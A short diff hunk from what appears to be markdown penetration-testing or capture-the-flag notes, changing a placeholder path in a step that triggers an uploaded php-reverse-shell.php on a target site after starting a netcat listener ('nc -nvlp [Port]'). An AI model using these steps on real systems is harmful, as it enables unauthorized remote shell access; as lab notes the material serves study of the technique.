@@ -94,7 +94,7 @@ nc -nvlp [Port]
 ```
 > Run php-reverse-shell.php on the website. For example:
 ```
-http://[Target Website]/[Uploads]/php-reverse-shell.php
+http://[Target Website]/uploads/php-reverse-shell.php
 ```
 > If we have gained access to the port we are listening to via Netcat, but the Linux commands we are used to are not working, let's check whether this is Python.
 ```
